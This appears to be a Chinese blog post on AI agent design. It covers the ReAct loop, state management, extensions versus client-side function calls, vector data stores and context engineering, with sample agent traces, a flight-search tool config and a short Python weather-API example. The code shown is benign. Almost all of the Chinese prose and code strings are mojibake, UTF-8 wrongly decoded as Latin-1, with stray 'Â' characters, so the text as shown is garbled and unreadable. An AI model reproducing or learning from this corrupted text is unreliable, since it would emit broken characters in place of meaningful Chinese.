<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfd9939ee3b141d296e4fae73b7f54ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=fGZpBQ7c5Oj4nGPHSw6WtkXRNiY%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">User: æˆ‘æƒ³è®¢ä¸€å¼ ä¸‹å‘¨ä»åŒ—äº¬åˆ°ä¸Šæµ·çš„æœºç¥¨ã€‚</span>
<span class="hljs-section">Thought: æˆ‘éœ€è¦æŸ¥è¯¢èˆªç­ä¿¡æ¯å¹¶è¿›è¡Œæ¯”è¾ƒã€‚</span>
<span class="hljs-section">Action: è°ƒç”¨ã€èˆªç­æœç´¢ã€‘å·¥å…·</span>
Action Input: {<span class="hljs-string">"from"</span>:Â <span class="hljs-string">"åŒ—äº¬"</span>,Â <span class="hljs-string">"to"</span>:Â <span class="hljs-string">"ä¸Šæµ·"</span>,Â <span class="hljs-string">"date"</span>:Â <span class="hljs-string">"ä¸‹å‘¨"</span>}
<span class="hljs-section">Observation: èˆªç­å·¥å…·è¿”å›äº†å¤šç­æ¬¡èˆªç­ä¿¡æ¯ã€‚</span>
<span class="hljs-section">Thought: æˆ‘åº”è¯¥æŒ‘é€‰ä»·æ ¼å’Œæ—¶é—´åˆé€‚çš„èˆªç­ã€‚</span>
Final Answer: æ ¹æ®æŸ¥è¯¢ç»“æœï¼Œä¸‹å‘¨ä»åŒ—äº¬åˆ°ä¸Šæµ·çš„èˆªç­æœ‰...ï¼ˆåˆ—å‡ºä¿¡æ¯ï¼‰ã€‚
</code></pre>
<h3 data-id="heading-3">çŠ¶æ€ç®¡ç†</h3>
<p>é™¤åŸºæœ¬æ¡†æ¶ä¹‹å¤–ï¼Œç¼–æ’å±‚è¿˜è´Ÿè´£ç»´æŠ¤<strong>äº¤äº’çŠ¶æ€å’Œå†å²è®°å¿†</strong>ã€‚</p>
<p>ä¸æ¨¡å‹çš„å•è½®å¯¹è¯ä¸åŒï¼ŒAgentéœ€è¦ç®¡ç†å¯¹è¯å†å²ï¼Œå°†å…ˆå‰çš„å¯¹è¯å†…å®¹ã€ç”¨æˆ·æŒ‡ä»¤å’Œå·¥å…·åé¦ˆçº³å…¥çŠ¶æ€ï¼Œå¦åˆ™çš„è¯å¤šè½®å¯¹è¯å°±ä¼šèƒ¡è¨€ä¹±è¯­ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨å’¨è¯¢ç±»å¯¹è¯ä¸­ï¼ŒAgentä¼šè®°ä½ç”¨æˆ·ä¹‹å‰çš„é—®é¢˜å’Œä¸Šä¸‹æ–‡ï¼Œä¸æ–­ç§¯ç´¯ä¿¡æ¯ï¼Œè¿™å¯¹è§£å†³å¤æ‚é—®é¢˜å’Œæä¾›è¿ç»­æœåŠ¡è‡³å…³é‡è¦ã€‚</p>
<p>æ€»ä¹‹ï¼Œç¼–æ’å±‚å°±åƒAgentçš„â€œå¤§è„‘â€ï¼Œé€šè¿‡å¾ªç¯çš„åé¦ˆæœºåˆ¶å’Œæç¤ºå·¥ç¨‹æ¡†æ¶ï¼Œå¼•å¯¼æ¨¡å‹åˆç†åˆ©ç”¨å·²æœ‰ä¿¡æ¯å’Œå·¥å…·ä¸€æ­¥æ­¥å®ç°ç›®æ ‡ã€‚</p>
<p>çŠ¶æ€ç®¡ç†å¥½åç›´æ¥å…³ç³»åˆ°Agentäº§å“çš„æœ€ç»ˆè¡¨ç°ï¼Œåªä¸è¿‡è¿™é‡Œçš„<strong>çŠ¶æ€ç®¡ç†æå…¶å›°éš¾</strong>ï¼Œå¦‚æœå±•å¼€çš„è¯ä¸‡å­—éƒ½æ‹¿ä¸ä¸‹æ¥...</p>
<h2 data-id="heading-4">å·¥å…·ä½“ç³»</h2>
<p><strong>å·¥å…·æ˜¯æ¨¡å‹ä¸å¤–éƒ¨ä¸–ç•Œä¹‹é—´çš„æ¡¥æ¢ï¼Œä½¿å¾—Agentå¯ä»¥è®¿é—®å¹¶å¤„ç†çœŸå®ä¿¡æ¯</strong></p>
<p>æ ¹æ®æˆ‘ä¹‹å‰çš„å®è·µç»éªŒï¼š<strong>Agentæœ€éš¾çš„éƒ¨åˆ†æ˜¯çŠ¶æ€ç®¡ç†ï¼Œæœ€çƒ¦ï¼ˆä¸ç¨³å®šï¼‰çš„éƒ¨åˆ†æ˜¯æ„å›¾è¯†åˆ«ï¼Œå·¥ä½œé‡æœ€å¤§çš„éƒ¨åˆ†æ˜¯å·¥å…·ä½“ç³»...</strong></p>
<p>å¸¸è§çš„å·¥å…·ç±»å‹åŒ…æ‹¬ æ‰©å±•ï¼ˆExtensionsï¼‰ã€å‡½æ•°è°ƒç”¨ï¼ˆFunctionsï¼‰ å’Œ æ•°æ®å­˜å‚¨ï¼ˆData Storesï¼‰ ç­‰ï¼Œå®ƒä»¬å„è‡ªæ‰¿æ‹…ä¸åŒèŒè´£ï¼Œå…±åŒæ„å»ºäº†æ™ºèƒ½ä½“ä¸å¤–éƒ¨ç¯å¢ƒäº¤äº’çš„èƒ½åŠ›ã€‚ä¸‹é¢åˆ†åˆ«ä»‹ç»è¿™å‡ ç§å·¥å…·ç±»å‹:</p>
<h3 data-id="heading-5">æ‰©å±•</h3>
<p>æ‰€è°“æ‰©å±•ä¹Ÿå°±æ˜¯<strong>æå‰é…ç½®å¥½çš„ä¸€æ‰¹å¯è°ƒç”¨ API æ¨¡å— + æ¨¡å‹èƒ½çœ‹æ‡‚çš„è°ƒç”¨è¯´æ˜</strong>ï¼Œå…¶åº•å±‚åŸºç¡€æ˜¯æ¨¡å‹çš„Function Callingï¼Œç›®çš„æ˜¯è®©æ¨¡å‹ä¸éœ€è¦çŸ¥é“å¾ˆå¤š API çš„ç»†èŠ‚ï¼Œåªéœ€è¦ç»™å…³é”®è¯ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">Action:</span> èˆªç­æŸ¥è¯¢ Â 
Action Input: {<span class="hljs-keyword">from</span>:Â <span class="hljs-string">"åŒ—äº¬"</span>, <span class="hljs-keyword">to</span>:Â <span class="hljs-string">"ä¸Šæµ·"</span>, <span class="hljs-type">date</span>:Â <span class="hljs-string">"2025-12-10"</span>}
</code></pre>
<p>è¿™é‡Œå†ç»™ä¸€ä¸ªé…ç½®ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-css" lang="css">{
Â Â "name":Â <span class="hljs-string">"search_flights"</span>,
<span class="hljs-string">"description"</span>:Â <span class="hljs-string">"æŸ¥è¯¢æŒ‡å®šæ—¥æœŸçš„èˆªç­ä¿¡æ¯"</span>,
<span class="hljs-string">"params"</span>: {
Â  Â Â "<span class="hljs-selector-tag">from</span>":Â <span class="hljs-string">"å‡ºå‘åŸå¸‚"</span>,
Â  Â Â <span class="hljs-string">"to"</span>:Â <span class="hljs-string">"ç›®çš„åŸå¸‚"</span>,
Â  Â Â <span class="hljs-string">"date"</span>:Â <span class="hljs-string">"å‡ºå‘æ—¥æœŸï¼ˆYYYY-MM-DDï¼‰"</span>
Â  },
"example_calls": [
Â  Â  {
Â  Â  Â Â "user_input":Â <span class="hljs-string">"æˆ‘æƒ³æŸ¥æ˜å¤©ä»åŒ—äº¬é£ä¸Šæµ·çš„èˆªç­"</span>,
Â  Â  Â Â <span class="hljs-string">"action"</span>:Â <span class="hljs-string">"search_flights"</span>,
Â  Â  Â Â <span class="hljs-string">"action_input"</span>: {
Â  Â  Â  Â Â "<span class="hljs-selector-tag">from</span>":Â <span class="hljs-string">"åŒ—äº¬"</span>,
Â  Â  Â  Â Â <span class="hljs-string">"to"</span>:Â <span class="hljs-string">"ä¸Šæµ·"</span>,
Â  Â  Â  Â Â <span class="hljs-string">"date"</span>:Â <span class="hljs-string">"2025-12-10"</span>
Â  Â  Â  }
Â  Â  }
Â  ]
}
</code></pre>
<h3 data-id="heading-6">å‡½æ•°è°ƒç”¨</h3>
<p>å‡½æ•°è°ƒç”¨ä¸æ‰©å±•ç±»ä¼¼ï¼ˆéƒ½æ˜¯Function Callingï¼‰ï¼Œä¹Ÿæ˜¯æä¾›ç»™æ¨¡å‹è°ƒç”¨å¤–éƒ¨åŠŸèƒ½çš„æ¥å£ï¼Œä½†å®ƒæ›´ä¾§é‡äºå®¢æˆ·ç«¯ï¼ˆåº”ç”¨ç«¯ï¼‰æ‰§è¡Œï¼Œè€Œä¸æ˜¯åœ¨æ™ºèƒ½ä½“æœåŠ¡å™¨ç«¯ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71b945df5503481790e221b91ec8149a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=B7gCCfxdYp5s8eb7jnDzHUBeCf0%3D" alt="" loading="lazy"/></p>
<p>ä¸æ‰©å±•å¯¹æ¯”çš„ä¸»è¦å·®åˆ«åœ¨äºï¼Œæ‰©å±•åœ¨æ™ºèƒ½ä½“ç«¯æ‰§è¡Œè°ƒç”¨å¤–éƒ¨æœåŠ¡ï¼Œè€Œå‡½æ•°åœ¨å®¢æˆ·ç«¯æ‰§è¡Œã€‚è¿™æ„å‘³ç€å³ä½¿æ¨¡å‹é€‰æ‹©äº†æŸä¸ªå‡½æ•°ï¼Œå®é™…çš„ API è°ƒç”¨å¯èƒ½ä¼šåœ¨å¦ä¸€ä¸ªæœåŠ¡å±‚é¢å®Œæˆã€‚</p>
<p>è¿™é‡Œå¤§å®¶è¯»èµ·æ¥å¯èƒ½æœ‰ç‚¹ç»•ï¼Œå› ä¸ºæ‰©å±•å’Œå‡½æ•°ç›¸ä¼¼åº¦å¾ˆé«˜ï¼Œæˆ‘ä»¬è¿™é‡Œåšä¸‹ä¸¾ä¾‹è¯´æ˜ï¼š</p>
<p>æ‰©å±•å±äºç³»ç»Ÿè‡ªå·±å¹²ï¼Œä½ è¯´â€œå¸®æˆ‘æŸ¥å¤©æ°”â€ï¼Œå®ƒè‡ªå·±è°ƒæ¥å£ã€è‡ªå·±æ‹¿æ•°æ®ã€è‡ªå·±å¹²ï¼š</p>
<pre><code class="hljs">æ¨¡å‹ï¼šæˆ‘éœ€è¦æŸ¥ä¸‹å¤©æ°”
Agentç³»ç»Ÿï¼šå¥½çš„ï¼Œæˆ‘æœ‰æ‰‹ï¼Œæˆ‘æ¥è°ƒ API weather.com è·å–æ•°æ®
</code></pre>
<p>å‡½æ•°æ˜¯æ¨¡å‹è‡ªå·±ä¸åšäº‹ï¼Œå®ƒåªæ˜¯å‘Šè¯‰ä½ â€œä½ å»åšâ€ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">æ¨¡å‹ï¼šæˆ‘å»ºè®®è°ƒç”¨å‡½æ•° <span class="hljs-built_in">playVideo</span>({videoId: <span class="hljs-number">123</span>})
åº”ç”¨å‰ç«¯ï¼šæ”¶åˆ°ï¼Œæˆ‘æ¥æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼ˆæ¯”å¦‚è°ƒæ’­æ”¾å™¨ï¼‰
</code></pre>
<p>è¿™ç§å·®å¼‚çš„åŸå› æ˜¯<strong>å®‰å…¨æ€§ã€ç¦»çº¿ã€å¼‚æ­¥</strong>ç­‰åŸå› ï¼Œä¸­æ–­å¼è°ƒç”¨ç”¨å‡½æ•°ï¼Œéä¸­æ–­å¼ç”¨æ‰©å±•ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ‰©å±•æ¡ˆä¾‹ï¼š</span>
Action: query_weather
Action Input: {<span class="hljs-string">"city"</span>:Â <span class="hljs-string">"åŒ—äº¬"</span>,Â <span class="hljs-string">"date"</span>:Â <span class="hljs-string">"2025-12-10"</span>}

<span class="hljs-comment"># Agentç³»ç»Ÿé€»è¾‘ï¼ˆè‡ªåŠ¨æ‰§è¡Œï¼‰ï¼š</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">agent_runtime</span>():
Â  Â Â <span class="hljs-keyword">if</span>Â action ==Â <span class="hljs-string">"query_weather"</span>:
Â  Â  Â  Â  result = requests.get(<span class="hljs-string">f"https://api.weather.com?city=<span class="hljs-subst">{city}</span>&amp;date=<span class="hljs-subst">{date}</span>"</span>)
Â  Â  Â  Â  send_back_to_model(result)

<span class="hljs-comment"># å‡½æ•°æ¡ˆä¾‹ï¼Œä¸­æ–­å¼ï¼š</span>
Function Call: open_camera
Args: {<span class="hljs-string">"resolution"</span>:Â <span class="hljs-string">"1080p"</span>}

<span class="hljs-comment"># å®¢æˆ·ç«¯ / æµè§ˆå™¨æ‰§è¡Œï¼ˆä½ æ¥å†™ï¼‰ï¼š</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">on_function_call</span>(<span class="hljs-params">fn_name, args</span>):
Â  Â Â <span class="hljs-keyword">if</span>Â fn_name ==Â <span class="hljs-string">"open_camera"</span>:
Â  Â  Â  Â  open_webcam(args[<span class="hljs-string">"resolution"</span>])
</code></pre>
<h3 data-id="heading-7">æ•°æ®å­˜å‚¨</h3>
<p>æ•°æ®å­˜å‚¨ä¸ºAgentæä¾›äº†â€œé•¿æœŸè®°å¿†â€å’ŒçŸ¥è¯†åº“çš„åŠŸèƒ½ï¼Œç‰¹åˆ«é€‚ç”¨äºéœ€è¦æŸ¥è¯¢å¤§é‡ç»“æ„åŒ–æˆ–éç»“æ„åŒ–ä¿¡æ¯çš„åœºæ™¯ã€‚</p>
<p>æ ¸å¿ƒæ€æƒ³æ˜¯å°†å¤–éƒ¨æ–‡æ¡£æˆ–æ•°æ®åº“è½¬æ¢æˆå‘é‡ç´¢å¼•ï¼Œè®©æ¨¡å‹é€šè¿‡æ£€ç´¢æ¥è·å–æœ€æ–°å†…å®¹ï¼Œä»è€Œæ‰©å±•å…¶çŸ¥è¯†è¾¹ç•Œã€‚å¸¸è§åšæ³•æ˜¯æ„å»ºå‘é‡åº“æˆ–çŸ¥è¯†åº“ï¼Œå°†æ–‡æ¡£ã€ç½‘é¡µã€è¡¨æ ¼ç­‰é¢„å¤„ç†ä¸ºé«˜ç»´åµŒå…¥å­˜å‚¨ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93147f49be054d0783f8fffc027399dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=Ih4vURUZ%2BPxMiupYXOCvSpwJRNI%3D" alt="" loading="lazy"/></p>
<p>ä¾‹å¦‚ï¼Œå¯¹äºå…¬å¸å†…éƒ¨çŸ¥è¯†åº“é—®ç­”ï¼Œæ™ºèƒ½ä½“ä¼šå…ˆå°†ç”¨æˆ·é—®é¢˜è½¬æ¢ä¸ºå‘é‡å¹¶æ£€ç´¢é¢„ç´¢å¼•çš„å†…éƒ¨æ–‡æ¡£ï¼Œå¾—åˆ°çš„ç›¸å…³æ–‡æ¡£æ®µè½ä½œä¸ºè¡¥å……ä¿¡æ¯æä¾›ç»™æ¨¡å‹ã€‚è¿™æ ·ï¼Œç”Ÿæˆçš„å›ç­”å°±åŸºäºæœ€æ–°çš„ä¸šåŠ¡æ‰‹å†Œæˆ–æ³•è§„æ–‡æœ¬ï¼Œè€Œä¸æ˜¯ä»…å‡­æ¨¡å‹è®­ç»ƒæ—¶æœ‰é™çš„æ•°æ®ã€‚</p>
<p>å¦‚å›¾ç¤ºä¾‹æ‰€ç¤ºï¼Œç”¨æˆ·æŸ¥è¯¢â€œå…¬å¸åœ¨åŒ—ç¾çš„æœ€æ–°ä¸šåŠ¡è§„æ¨¡å¦‚ä½•ï¼Ÿâ€ï¼Œæ™ºèƒ½ä½“å…ˆæ£€ç´¢è´¢ç»æŠ¥å‘Šå’Œå¸‚åœºæ•°æ®ï¼Œç„¶ååœ¨ ReAct å¾ªç¯ä¸­åˆ©ç”¨è¿™äº›æ£€ç´¢ç»“æœè¿›è¡Œç»¼åˆæ¨ç†å’Œå›ç­”ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c7168be4f7e44bf942c28cfe405ebdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=Jg0udHvWhQriSXlZDF6VJMjMso4%3D" alt="" loading="lazy"/></p>
<p>å…¶å®ä»è¿™éƒ¨åˆ†å†…å®¹è´¨é‡æ¥è¯´ï¼ŒGoogleçš„æŠ¥å‘Šå†™å¾—æŒºä¸€èˆ¬çš„ï¼Œä½œä¸ºç§‘æ™®è¯»ç‰©æŒºä¸é”™çš„...</p>
<h2 data-id="heading-8">è®°å¿†ç³»ç»Ÿ</h2>
<p>åœ¨Agentç³»ç»Ÿä¸­ï¼Œ<strong>è®°å¿†å±‚</strong>ä¸ä»…è´Ÿè´£ä¿å­˜ä¸Šä¸‹æ–‡ã€æ”¯æ’‘å¤šè½®å¯¹è¯ï¼Œå®ƒæ›´æ·±å±‚çš„èŒè´£ï¼Œæ˜¯å›ç­”è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š</p>
<blockquote>
<p>æ•°æ®å¦‚ä½•ä¸AIäº¤äº’ï¼Œæ‰èƒ½è®©å¤§æ¨¡å‹â€œçœŸæ­£ç†è§£ä»»åŠ¡â€ï¼Ÿ</p>
</blockquote>
<p>è¿™ä¸€é—®é¢˜çš„å›ç­”ï¼Œè¿‘æ¥å¸¸è¢«åŒ…è£…ä¸ºä¸€ä¸ªæ–°æœ¯è¯­ï¼š<strong>ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼ˆContext Engineeringï¼‰ã€‚</strong></p>
<p>ä½†ä»æœ¬è´¨çœ‹ï¼Œå®ƒä»æ˜¯å¯¹â€œå¦‚ä½•æ„é€ æœ‰æ•ˆPromptâ€çš„æ·±åŒ–å’Œç»“æ„åŒ–è®¾è®¡ï¼Œæ˜¯æç¤ºè¯å·¥ç¨‹åœ¨å¤æ‚ä»»åŠ¡è½åœ°åœºæ™¯ä¸‹çš„è‡ªç„¶æ¼”è¿›ã€‚</p>
<h3 data-id="heading-9">ä¸Šä¸‹æ–‡å·¥ç¨‹</h3>
<p>é€šå¸¸æˆ‘ä»¬å°† Agent çš„è®°å¿†ç³»ç»Ÿåˆ’åˆ†ä¸ºä¸¤ä¸ªå±‚æ¬¡ï¼š</p>
<p><strong>ä¸€ã€çŸ­æœŸè®°å¿†ï¼ˆShort-Term Memoryï¼‰</strong></p>
<p>æŒ‡å½“å‰ä¼šè¯çš„ä¸Šä¸‹æ–‡å†å²ï¼ŒåŒ…æ‹¬ç”¨æˆ·è¾“å…¥ã€æ¨¡å‹å›å¤ã€ä¸­é—´æ¨ç†ç—•è¿¹ï¼›</p>
<p>å¤šä¿å­˜åœ¨ç¼–æ’å±‚çš„å¯¹è¯çŠ¶æ€ä¸­ï¼Œç”¨ä½œ Prompt ä¸Šä¸‹æ–‡æ„å»ºã€‚</p>
<p><strong>äºŒã€é•¿æœŸè®°å¿†ï¼ˆLong-Term Memoryï¼‰</strong></p>
<p>æŒ‡è·¨ä¼šè¯çš„çŸ¥è¯†å­˜å‚¨ï¼Œå¦‚ç”¨æˆ·åå¥½ã€å†å²æ•°æ®ã€ç»„ç»‡å†…éƒ¨èµ„æ–™ã€æ–‡æ¡£åº“ç­‰ï¼›</p>
<p>é€šå¸¸é€šè¿‡å‘é‡æ£€ç´¢ï¼ˆRAG**ï¼‰ç­‰æ–¹å¼åŠ¨æ€å–ç”¨ï¼Œå®ç°åœ¨è¿è¡Œæ—¶â€œè¡¥å…¨çŸ¥è¯†â€ã€‚</p>
<p>ä½†çœŸå®åœºæ™¯ä¸­ï¼Œè®°å¿†ç³»ç»Ÿè¿œä¸æ­¢â€œå­˜+å–â€è¿™ä¹ˆç®€å•ï¼Œå®ƒçš„æ ¸å¿ƒç›®æ ‡æ˜¯ï¼š</p>
<blockquote>
<p>ä¸ºå¤§æ¨¡å‹æä¾›â€œæ°åˆ°å¥½å¤„â€çš„ä¿¡æ¯ï¼Œæ—¢ä¸è¿‡å¤šæ‰“æ‰°æ¨¡å‹ï¼Œä¹Ÿä¸é—æ¼å…³é”®ä¿¡æ¯</p>
</blockquote>
<p>è¿™å¼•å‡ºäº†â€œä¸Šä¸‹æ–‡å·¥ç¨‹â€çš„å®æ“ä¸‰éš¾ç‚¹ï¼š</p>
<ol>
<li><strong>æ‹¿å¾—åˆ°å—ï¼Ÿ</strong> æ£€ç´¢é€»è¾‘æ˜¯å¦åˆç†ï¼Œæ˜¯å¦æ¼æ‰å…³é”®ä¿¡æ¯ï¼Ÿ</li>
<li><strong>æ‹¿å¾—å‡†å—ï¼Ÿ</strong> å†…å®¹æ˜¯å¦ç›¸å…³ï¼Ÿæ˜¯å¦è¿‡å¤šå¹²æ‰°æ¨¡å‹æˆ–ä¸¥é‡ç¼ºæ¼ï¼Ÿ</li>
<li><strong>ç”¨å¾—å¯¹å—ï¼Ÿ</strong> æœ€ç»ˆç»„ç»‡è¿› Prompt çš„æ–¹å¼æ˜¯å¦æœ‰æ•ˆæ¿€å‘æ¨¡å‹è¾“å‡ºï¼Ÿ</li>
</ol>
<p>ä»å·¥ç¨‹è§’åº¦è®²ï¼Œä¸Šä¸‹æ–‡å°±åƒ Prompt çš„RAMï¼Œå®¹é‡æœ‰é™ä½†ç›´æ¥å†³å®šæ¨¡å‹è¿è¡Œè¡¨ç°ã€‚è®¾è®¡åˆç†çš„ä¸Šä¸‹æ–‡ç»„ç»‡ç­–ç•¥ï¼Œæ˜¯Agentç³»ç»Ÿæœ€é‡è¦çš„ç«äº‰åŠ›ä¹‹ä¸€ã€‚</p>
<p>æ ¹æ®ä¹‹å‰çš„ç»éªŒï¼Œå¯ä»¥æŠŠä¸Šä¸‹æ–‡å·¥ç¨‹æ“ä½œæ¨¡å¼åˆ†ä¸ºå››ç±»ï¼š</p>



































<table><thead><tr><th>æ‰‹æ³•</th><th>æ ¸å¿ƒæ€è·¯</th><th>ç±»æ¯”</th><th>å¸¸è§åœºæ™¯</th></tr></thead><tbody><tr><td><strong>1. è®°å½•å¼ï¼ˆWriteï¼‰</strong></td><td>è®© AI éšæ—¶æŠŠé‡è¦ç»†èŠ‚å†™è¿›â€œéšèº«ç¬”è®°â€</td><td>äººç±»åšä¼šè®®é€Ÿè®°</td><td>ChatGPT å­˜ç”¨æˆ·å¸¸ç‚¹å¤–å–ã€åå¥½ç­‰</td></tr><tr><td><strong>2. ç”„é€‰å¼ï¼ˆSelectï¼‰</strong></td><td>ä»èµ„æ–™ä¸­æŒ‘å‡ºæœ€ relevant çš„å†å–‚ç»™æ¨¡å‹</td><td>å›¾ä¹¦ç®¡ç†å‘˜æ‰¾æŒ‡å®šç« èŠ‚</td><td>Code Agent æ£€ç´¢å‡½æ•°æ–‡ä»¶ã€çŸ¥è¯†ç‚¹</td></tr><tr><td><strong>3. ç²¾ç®€å¼ï¼ˆCompressï¼‰</strong></td><td>å½“ä¿¡æ¯çˆ†æ£šï¼Œç”¨æ‘˜è¦ã€æç‚¼ã€å»å†—ä½™æ‰‹æ®µå‡è½»æ¨¡å‹è´Ÿæ‹…</td><td>ç»™è®ºæ–‡å†™æ‘˜è¦</td><td>Claude å¿«æ»¡çª—å£æ—¶è‡ªåŠ¨å‹ç¼©å†å²å¯¹è¯</td></tr><tr><td><strong>4. åˆ†éš”å¼ï¼ˆIsolateï¼‰</strong></td><td>å°†å¤æ‚ä»»åŠ¡æ‹†åˆ†ç»™å¤šä¸ªâ€œåŠ©æ‰‹â€ï¼Œå„è‡ªè®°å¿†ä¸åŒä¸Šä¸‹æ–‡</td><td>é¡¹ç›®ç»ç†åˆ†æ´¾å­ä»»åŠ¡</td><td>Swarm Agent ä¸­å¤šä¸ªå­æ¨¡å‹åˆ†å·¥åä½œ</td></tr></tbody></table>
<p>è¿™äº›æ–¹æ³•çš„ç»„åˆï¼Œæ„æˆäº†çœŸæ­£èƒ½ç”¨ã€èƒ½è½åœ°çš„ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼Œå…¶å®å¤§å®¶ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥äº†ï¼Œ<strong>å°½ç®¡ä¸Šä¸‹æ–‡å·¥ç¨‹ã€Agentçš„è®°å¿†ç³»ç»Ÿå¬èµ·æ¥å¾ˆå±Œï¼Œå…¶æœ¬è´¨è¿˜æ˜¯å¤æ‚çš„æç¤ºè¯å·¥ç¨‹</strong>...</p>
<p>æœ€åå›å½’åˆ°Â <strong>Agent ReAct æ¡†æ¶</strong>ï¼Œæˆ‘ä»¬å†çœ‹çœ‹å››å¤§ç»„ä»¶çš„å…³ç³»ï¼š</p>
<h3 data-id="heading-10">ReAct æ¡†æ¶ä¸­çš„è®°å¿†å±‚è§’è‰²</h3>
<p>åœ¨ReActæ¡†æ¶ä¸­ï¼Œæ¯ä¸€ä¸ª Thought çš„è´¨é‡ï¼Œä¸¥é‡ä¾èµ–äºCoTï¼Œè€ŒCoTåˆä¸¥é‡ä¾èµ–äºè®°å¿†ç³»ç»Ÿæä¾›çš„ä¿¡æ¯æ˜¯å¦å……è¶³ã€æ˜¯å¦å‡†ç¡®ã€æ˜¯å¦å¹²æ‰°æœ€å°ã€‚</p>
<p>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè®°å¿†ç³»ç»Ÿè´Ÿè´£ä¸º Thought æ„å»ºä¸Šä¸‹æ–‡è¾“å…¥ï¼Œå³ Prompt ä¸­çš„ Memory åŒºå—ã€‚ä¸€ä¸ªå…¸å‹çš„ ReAct è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">User:</span> <span class="hljs-string">æˆ‘éœ€è¦æ‰¾ä¸€å¼ æ˜å¤©ä¸‹åˆä»åŒ—äº¬å»ä¸Šæµ·çš„é«˜é“ç¥¨</span>
<span class="hljs-string">-----------------</span>
<span class="hljs-attr">Thought:</span> <span class="hljs-string">æˆ‘éœ€è¦æŸ¥è¯¢é«˜é“ç¥¨ä¿¡æ¯</span>
<span class="hljs-attr">Action:</span> <span class="hljs-string">æŸ¥è¯¢é«˜é“</span> <span class="hljs-string">APIï¼ˆè¾“å…¥åŸå¸‚å’Œæ—¶é—´ï¼‰</span>
<span class="hljs-attr">Observation:</span> <span class="hljs-string">è¿”å›å¤šä¸ªç­æ¬¡å’Œæ—¶é—´æ®µ</span>
<span class="hljs-attr">Thought:</span> <span class="hljs-string">æˆ‘æŒ‘é€‰ä¸€ä¸ªä¸‹åˆå‡ºå‘ã€ä»·æ ¼åˆé€‚çš„è½¦æ¬¡</span>
<span class="hljs-attr">Action:</span> <span class="hljs-string">None</span>
<span class="hljs-attr">Final Answer:</span> <span class="hljs-string">ä¸ºæ‚¨æ‰¾åˆ°ä¸¤å¼ æ˜å¤©ä¸‹åˆä»åŒ—äº¬åˆ°ä¸Šæµ·çš„é«˜é“ç¥¨...ï¼ˆè¾“å‡ºç»“æœï¼‰</span>
</code></pre>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼š</p>
<ol>
<li>è‹¥ä¹‹å‰ç”¨æˆ·å·²ç»è¡¨è¾¾è¿‡åå¥½å¦‚â€œåªè¦ä¸€ç­‰åº§â€ã€â€œä¸ååŠ¨è½¦â€ç­‰ï¼Œé•¿æœŸè®°å¿†éœ€è¦æä¾›è¿™äº›åå¥½ä¿¡æ¯ï¼›</li>
<li>è‹¥ç”¨æˆ·æ­¤å‰æè¿‡â€œå’Œæ˜¨å¤©æµç¨‹ä¸€æ ·â€ï¼ŒçŸ­æœŸè®°å¿†è¦å‡†ç¡®æå–é‚£æ¬¡ä¼šè¯å†…å®¹ï¼›</li>
<li>è‹¥è°ƒç”¨æŸ¥è¯¢å·¥å…·è¿”å›å¤§é‡å†…å®¹ï¼Œè®°å¿†ç³»ç»Ÿéœ€åˆ¤æ–­æå–å“ªäº› Observation å¡å…¥ä¸‹ä¸€æ­¥ Promptï¼›</li>
</ol>
<p>ä»è¿™é‡Œå¤§å®¶ä¹Ÿå¯ä»¥çœ‹å‡ºReActçš„é‡è¦æ€§å’Œå¤æ‚åº¦äº†ï¼Œä»–æ˜¯æ¨åŠ¨æ¨ç†å¾ªç¯å‘å‰çš„åŸºç¡€ã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼Œä¸ºä»€ä¹ˆè¯´ä¸Šä¸‹æ–‡å·¥ç¨‹æ˜¯æ•´å¥— Agent æ¶æ„æœ€å®¹æ˜“å¿½è§†ã€ä½†æœ€å®¹æ˜“å‡ºé—®é¢˜çš„éƒ¨åˆ†ï¼Ÿå› ä¸ºå®ƒä¸€æ—¦åšä¸å¥½ï¼Œæ¨¡å‹ç”Ÿæˆçš„ Thought å°†ä¼šæ˜¯ç©ºè½¬ã€åç¦»ã€æˆ–è€…å¹»è§‰çš„ã€‚</p>
<p>æ€»è€Œè¨€ä¹‹ï¼Œè¿™å—æ˜¯äº‹å®ä¸Šçš„éš¾ç‚¹ï¼Œå¤§å®¶å¥½å¥½ä½“æ‚Ÿå§ã€‚</p>
